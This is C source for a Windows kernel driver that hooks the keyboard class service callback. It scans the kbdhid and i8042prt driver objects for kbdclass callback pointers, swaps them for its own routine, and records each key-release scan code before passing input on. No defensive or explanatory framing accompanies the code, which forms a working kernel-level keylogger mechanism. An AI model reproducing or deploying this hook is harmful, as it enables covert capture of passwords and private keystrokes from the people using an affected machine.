#include <ntddk.h>
#include <Ntstrsafe.h>
#include <ntddkbd.h>
#include "driver.h"

PKeyboardClassServiceCallbackFuncPtr g_oldCallbackPtr = NULL;
PKeyboardClassServiceCallbackFuncPtr* g_pOldCallbackPtrs[5] = { 0 };
int g_ptrCount = 0;
WCHAR g_usbName[] = L"\\Driver\\kbdhid";
WCHAR g_psName[] = L"\\Driver\\i8042prt";

VOID MyKeyboardClassServiceCallback(
	IN PDEVICE_OBJECT DeviceObject,
	IN PKEYBOARD_INPUT_DATA InputDataStart,
	IN PKEYBOARD_INPUT_DATA InputDataEnd,
	IN OUT PULONG InputDataConsumed)
{
	for (PKEYBOARD_INPUT_DATA input = InputDataStart; input != InputDataEnd; ++input) {
		if (input->Flags & KEY_BREAK) {
			print_keystroke((UCHAR)input->MakeCode);
		}
	}
	g_oldCallbackPtr(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);
}

VOID callbackDriverUnload(PDRIVER_OBJECT obj)
{
	UNREFERENCED_PARAMETER(obj);
	for (int i = 0; i < g_ptrCount; ++i) {
		*(g_pOldCallbackPtrs[i]) = g_oldCallbackPtr;
	}
}

BOOLEAN HookImpl(LPCWSTR targetName, PDRIVER_OBJECT kbdObj)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING driverName;
	RtlInitUnicodeString(&driverName, targetName);
	PDRIVER_OBJECT targetObj;
	status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL,
		0, *IoDriverObjectType, KernelMode, 0, &targetObj);
	if (!NT_SUCCESS(status)) {
		DbgPrint("cannot get %ws keyboard driver object", targetName);
		return FALSE;
	}
	ObDereferenceObject(targetObj);

	BOOLEAN bingo = FALSE;
	for (PDEVICE_OBJECT devObj = targetObj->DeviceObject;
		devObj != NULL; devObj = devObj->NextDevice) {
		PCHAR devExt = (PCHAR)devObj->DeviceExtension;
		for (PCHAR buff = devExt; buff < devExt + 4096 - sizeof(PVOID); buff++) {
			if (!MmIsAddressValid(buff) || !MmIsAddressValid(buff + sizeof(PVOID) - 1))
				break;
			PVOID callback_ptr = *(PVOID*)buff;
			if (callback_ptr > kbdObj->DriverStart &&
				(PCHAR)callback_ptr < ((PCHAR)kbdObj->DriverStart + kbdObj->DriverSize)) {
#pragma warning(push)
#pragma warning(disable:4152 4055)
				g_oldCallbackPtr = (PKeyboardClassServiceCallbackFuncPtr)callback_ptr;
				g_pOldCallbackPtrs[g_ptrCount] = (PKeyboardClassServiceCallbackFuncPtr*)buff;
				g_ptrCount++;
				InterlockedExchangePointer((PVOID*)buff, &MyKeyboardClassServiceCallback);
#pragma warning(pop)
				bingo = TRUE;
			}
		}
	}
	return bingo;
}

NTSTATUS HookServiceCallbackFunc()
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING driverName;
	RtlInitUnicodeString(&driverName, g_className);
	PDRIVER_OBJECT kbdObject;
	status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL,
		0, *IoDriverObjectType, KernelMode, 0, &kbdObject);
	if (!NT_SUCCESS(status)) {
		DbgPrint("cannot get kbdclass object");
		return status;
	}
	ObDereferenceObject(kbdObject);

	if (HookImpl(g_usbName, kbdObject) | HookImpl(g_psName, kbdObject)) {
		return STATUS_SUCCESS;
	} else {
		return STATUS_UNSUCCESSFUL;
	}
}
